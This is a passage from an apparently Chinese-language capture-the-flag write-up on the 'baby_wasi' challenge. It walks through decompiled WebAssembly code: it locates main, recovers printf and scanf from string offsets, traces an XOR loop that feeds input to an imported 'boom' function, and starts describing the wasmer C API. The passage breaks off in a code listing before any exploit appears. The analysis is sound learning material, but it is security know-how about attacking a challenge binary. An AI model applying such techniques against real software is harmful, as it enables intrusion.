<span class="n">i1</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i1</span><span class="p">));</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="mi">2u</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">&lt;&lt;=</span> <span class="p">(</span><span class="n">i2</span> <span class="o">&amp;</span> <span class="mi">31</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i32_store</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span><span class="p">),</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">1528</span><span class="p">));</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_environ_getZ_iii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B8</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">12u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_args_sizes_getZ_iii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B7</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B10</span><span class="p">;}</span>    
<span class="k">goto</span> <span class="n">B9</span><span class="p">;</span>    
<span class="nl">B10</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">2u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">&lt;&lt;=</span> <span class="p">(</span><span class="n">i1</span> <span class="o">&amp;</span> <span class="mi">31</span><span class="p">);</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">4u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span><span class="p">));</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">l2</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B7</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B7</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i32_store</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span><span class="p">),</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_args_getZ_iii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B7</span><span class="p">;}</span>    
<span class="nl">B9</span><span class="p">:;</span>    
<span class="n">__wasm_call_ctors</span><span class="p">();</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">main</span><span class="p">(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">__prepare_for_exit</span><span class="p">();</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B6</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">16u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">g0</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="k">goto</span> <span class="n">Bfunc</span><span class="p">;</span>    
<span class="nl">B8</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">71u</span><span class="p">;</span>    
<span class="n">_Exit</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">UNREACHABLE</span><span class="p">;</span>    
<span class="nl">B7</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">71u</span><span class="p">;</span>    
<span class="n">_Exit</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">UNREACHABLE</span><span class="p">;</span>    
<span class="nl">B6</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">_Exit</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">UNREACHABLE</span><span class="p">;</span>    
<span class="nl">B0</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">71u</span><span class="p">;</span>    
<span class="n">_Exit</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">UNREACHABLE</span><span class="p">;</span>    
<span class="nl">Bfunc</span><span class="p">:;</span>    
<span class="n">FUNC_EPILOGUE</span><span class="p">;</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>然后根据这个可以识别出来main函数，找到main函数以后就比较好找关键函数的位置了，关键函数如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kr">__int64</span> <span class="nf">real_main</span><span class="p">()</span>    
<span class="p">{</span>    
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST38_4    
</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax    
</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">c</span><span class="p">;</span> <span class="c1">// ST2C_4    
</span><span class="c1"></span><span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ST30_4    
</span><span class="c1"></span><span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-28h]    
</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-24h]    
</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">lucky_num</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]    
</span><span class="c1"></span>    
<span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">wasm_rt_call_stack_depth</span> <span class="o">&gt;</span> <span class="mh">0x1F4u</span> <span class="p">)</span>    
<span class="n">wasm_rt_trap</span><span class="p">(</span><span class="mi">7LL</span><span class="p">);</span>    
<span class="n">g0</span> <span class="o">-=</span> <span class="mi">96</span><span class="p">;</span>    
<span class="n">v7</span> <span class="o">=</span> <span class="n">g0</span><span class="p">;</span>    
<span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
<span class="n">v0</span> <span class="o">=</span> <span class="n">f28</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>    
<span class="n">f88</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>    
<span class="n">lucky_num</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">f89</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10000</span><span class="p">;</span>    
<span class="n">i32_store</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">lucky_num</span><span class="p">);</span>    
<span class="n">f40</span><span class="p">(</span><span class="mi">1024LL</span><span class="p">,</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>                      <span class="c1">// Your lucky number: %d\n    
</span><span class="c1"></span><span class="n">i32_store</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>    
<span class="n">f69</span><span class="p">(</span><span class="mi">1047u</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>                             <span class="c1">// %64s    
</span><span class="c1"></span><span class="k">while</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">!=</span> <span class="mi">64</span> <span class="p">)</span>    
<span class="p">{</span>    
<span class="n">c</span> <span class="o">=</span> <span class="n">i32_load8_u</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v5</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>    
<span class="n">v3</span> <span class="o">=</span> <span class="n">get_lucky</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">lucky_num</span><span class="p">);</span>    
<span class="n">i32_store8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v5</span><span class="o">++</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="n">v3</span> <span class="o">^</span> <span class="n">c</span><span class="p">);</span>    
<span class="p">}</span>    
<span class="n">Z_envZ_boomZ_vii</span><span class="p">(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">64LL</span><span class="p">);</span>              <span class="c1">// 调用boom函数    
</span><span class="c1"></span><span class="n">v1</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="mi">3416LL</span><span class="p">);</span>    
<span class="n">f39</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>    
<span class="n">g0</span> <span class="o">=</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">96</span><span class="p">;</span>    
<span class="o">--</span><span class="n">wasm_rt_call_stack_depth</span><span class="p">;</span>    
<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>f40的参数是1024,f69的参数是1047,刚好对应之前的字符串常量之间的偏移,memory的初始化如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">char</span> <span class="o">*</span><span class="nf">init_memory</span><span class="p">()</span>    
<span class="p">{</span>    
<span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rdx    
</span><span class="c1"></span><span class="n">_QWORD</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rdx    
</span><span class="c1"></span><span class="n">_QWORD</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rdx    
</span><span class="c1"></span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rdi    
</span><span class="c1"></span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rdx    
</span><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax    
</span><span class="c1"></span>    
<span class="n">wasm_rt_allocate_memory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mh">0x10000LL</span><span class="p">);</span>    
<span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">memory</span> <span class="o">+</span> <span class="mi">1024</span><span class="p">);</span>    
<span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="s">&#34;Your lucky number: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>    
<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">3060</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data_segment_data_0</span><span class="p">[</span><span class="mi">3060</span><span class="p">];</span>    
<span class="n">qmemcpy</span><span class="p">(</span>    
<span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">),</span>    
<span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="s">&#34;Your lucky number: %d</span><span class="se">\n</span><span class="s">&#34;</span> <span class="o">-</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">-</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">))),</span>    
<span class="mi">8LL</span> <span class="o">*</span> <span class="p">((((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v0</span> <span class="o">-</span> <span class="p">(((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3068</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">));</span>    
<span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">memory</span> <span class="o">+</span> <span class="mi">4096</span><span class="p">);</span>    
<span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">data_segment_data_1</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>    
<span class="n">v1</span><span class="p">[</span><span class="mi">328</span><span class="p">]</span> <span class="o">=</span> <span class="n">data_segment_data_1</span><span class="p">[</span><span class="mi">328</span><span class="p">];</span>    
<span class="n">qmemcpy</span><span class="p">(</span>    
<span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">),</span>    
<span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data_segment_data_1</span> <span class="o">-</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v1</span> <span class="o">-</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">))),</span>    
<span class="mi">8LL</span> <span class="o">*</span> <span class="p">((((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v1</span> <span class="o">-</span> <span class="p">(((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2632</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">));</span>    
<span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">memory</span> <span class="o">+</span> <span class="mi">6728</span><span class="p">);</span>    
<span class="o">*</span><span class="n">v2</span> <span class="o">=</span> <span class="n">data_segment_data_2</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>    
<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">348</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data_segment_data_2</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>    
<span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">);</span>    
<span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">-</span> <span class="n">v3</span><span class="p">;</span>    
<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data_segment_data_2</span> <span class="o">-</span> <span class="n">v4</span><span class="p">;</span>    
<span class="n">qmemcpy</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data_segment_data_2</span> <span class="o">-</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">8LL</span> <span class="o">*</span> <span class="p">((((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">356</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">));</span>    
<span class="k">return</span> <span class="n">result</span><span class="p">;</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>可以看到memory + 1024中是&quot;Your lucky number&quot;所以可以大致猜到f40是printf函数   <br>
然后其他的字符串偏移如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">.rodata:0000000000032FC0 data_segment_data_0 db <span class="s1">&#39;Your lucky number: %d&#39;</span>,0Ah,0    
.rodata:0000000000032FC0                 <span class="p">;</span> DATA XREF: init_memory+2A↑o    
.rodata:0000000000032FD7 a64s            db <span class="s1">&#39;%64s&#39;</span>,0    
.rodata:0000000000032FDC aReady          db <span class="s1">&#39;Ready!!!&#39;</span>,0    
</code></pre></td></tr></table>
</div>
</div><p>memory + 1024 - 0x32FC0 + 0x32FD7 = memory + 1047,所以f69的第一个参数是&quot;%64&quot;，推断出f69是scanf函数。附加一些wasm中函数含义</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">i32_store</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">lucky_num</span><span class="p">);</span>  <span class="c1">// v7+16 = lucky_num    
</span><span class="c1"></span><span class="n">c</span> <span class="o">=</span> <span class="n">i32_load8_u</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="n">v5</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>  <span class="c1">// c = v5+v7+32    
</span><span class="c1"></span><span class="n">v1</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">,</span> <span class="mi">3416LL</span><span class="p">);</span>  <span class="c1">//加载3416处的值到v1中    
</span></code></pre></td></tr></table>
</div>
</div><h3 id="wasmer-c-api">wasmer-c-api</h3>
<p>主程序baby_wasi加载并执行program.wasm，其中baby_wasi是使用了一些wasmer-c-api来执行wasm的，需要了解一下这些api的含义才能更好的理解程序执行过程. wasmer-c-api的手册https://docs.rs/wasmer-runtime-c-api/0.16.2/wasmer_runtime_c_api/   <br>
找到了一个使用wasmer-c-api执行wasm的例子，对照这个例子理解一下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
